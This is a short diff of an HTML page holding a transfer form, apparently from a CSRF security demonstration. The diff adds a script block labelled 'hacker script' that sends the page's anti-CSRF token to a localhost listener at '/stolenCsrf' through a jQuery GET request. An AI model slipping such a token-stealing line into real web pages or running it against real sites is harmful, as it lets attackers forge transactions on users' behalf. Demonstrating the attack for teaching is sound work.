@@ -61,7 +61,15 @@
         <input type="submit" value="Transfer">
     </form>
 </div>
+
+<div>
+
+</div>
+
 <script>
+
+    // hacker script
+    $.get("http://localhost:9999/stolenCsrf?"+xsrfToken);
 
     $("#csrfTokenField").val(xsrfToken);
 </script>
